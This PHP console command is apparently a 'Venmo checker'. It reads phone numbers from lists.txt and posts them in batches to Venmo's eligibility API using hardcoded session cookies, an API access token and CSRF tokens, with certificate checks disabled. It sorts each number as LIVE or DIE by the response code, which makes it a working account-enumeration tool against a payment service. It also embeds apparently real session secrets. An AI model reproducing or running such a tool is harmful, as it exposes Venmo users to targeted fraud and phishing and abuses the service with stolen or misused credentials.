<?php

namespace App\Commands;

use GuzzleHttp\Client;
use GuzzleHttp\Psr7\Response;
use LaravelZero\Framework\Commands\Command;
use Throwable;

enum VenmoStatus: string
{
    case LIVE = 'LIVE';
    case DIE = 'DIE';
    case UNKNOWN = 'UNKNOWN';
    case ERROR = 'ERROR';
}

class DefaultChecker extends Command
{
    /**
     * The signature of the command.
     *
     * @var string
     */
    protected $signature = 'default';

    /**
     * The description of the command.
     *
     * @var string
     */
    protected $description = 'Command description';

    protected $done = 1;

    /**
     * Execute the console command.
     *
     * @return mixed
     */
    public function handle()
    {
        $cookie = '_gid=GA1.2.155999791.1659926638; v_id=fp01-5d58844c-88df-437b-8df6-ba03f07fc645; _csrf=mI8ivkRZMs0bDyFC87t1US0I; csrftoken2=d81d318ba90044eaa189d02dbb2b232c; tcs=%7CvLogoButton_button___A1UZ%20layout_payOrRequestButton__4xwuL; api_access_token=bd44a9d4161d474c2a472a79c272ee9b8f8c1563e471e9424b26b495c075a9a4; _gat=1; w_fc=6956a0f5-2991-44e7-9139-7f990747ac2f; _ga=GA1.2.892972101.1659926638; _ga_9EEMPVZPSW=GS1.1.1659932229.2.1.1659932305.0; _dd_s=rum=0&expire=1659933215278&logs=0; amp_8f6a82=L254UQFEOJkKcS4jklDQkg.MjkxNDM2OTE5MzExNTY0ODMwMw==..1g9tqniuk.1g9tqq4et.5c.0.5c';
        $csrf = 'ur0CIURR-EbGu20S_ywDPR9do1UnOxLHJgAM';

        try {
            $client = new Client([
                'headers' => [
                    'cookie' => $cookie,
                ],
                'verify' => false,
            ]);

            collect(
                file(
                    getcwd().'/lists.txt'
                )
            )->map(
                fn ($item) => str($item)->replace(["\r", "\n"], '')
            )->chunk(10)->each(
                function ($lists) use (&$client, $csrf) {
                    collect($lists)
                        ->map(
                            function ($list) use (&$client, $csrf) {
                                return $client->postAsync('https://account.venmo.com/api/eligibility', [
                                    'json' => [
                                        'targetType' => 'phone',
                                        'targetId' => $list,
                                        'amountInCents' => 100,
                                        'action' => 'pay',
                                        'note' => 'jancok',
                                    ],
                                    'headers' => [
                                        'Accept' => '*/*',
                                        'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
                                        'content-type' => 'application/json',
                                        'csrf-token' => $csrf,
                                        'xsrf-token' => $csrf,
                                    ],
                                ])
                                    ->then(
                                        function (Response $response) use ($list) {
                                            $responseJson = optional(
                                                json_decode(
                                                    $response->getBody()->getContents()
                                                )
                                            );

                                            if ($responseJson->ineligibleReason === '111') {
                                                $this->writeResult($list, VenmoStatus::DIE);
                                            } elseif ($responseJson->ineligibleReason === '105') {
                                                $this->writeResult($list, VenmoStatus::LIVE);
                                            } else {
                                                $this->writeResult($list, VenmoStatus::UNKNOWN);
                                            }
                                        },
                                        function (Throwable $th) use ($list) {
                                            $this->writeResult(
                                                $list,
                                                VenmoStatus::ERROR,
                                                $th->getMessage()
                                            );
                                        }
                                    );
                            }
                        )
                        ->each(
                            fn ($promise) => $promise->wait()
                        );
                }
            );
        } catch (\Throwable $th) {
            $this->newLine();
            $this->error($th->getMessage());
            $this->newLine();
        }
    }

    protected function writeResult(string $list, VenmoStatus $status, ?string $message = '')
    {
        $resultPath = getcwd().'/result';

        if (! is_dir($resultPath)) {
            @mkdir($resultPath);
        }

        file_put_contents(
            $resultPath.'/'.$status->value.'.txt',
            $list.PHP_EOL,
            FILE_APPEND
        );

        if ($status != VenmoStatus::UNKNOWN || $status != VenmoStatus::ERROR) {
            $this->info("   {$this->done}     {$list}     {$status->value}");
        } else {
            $this->info("   {$this->done}     {$list}     {$message}     {$status->value}");
        }

        $this->done++;
    }
}
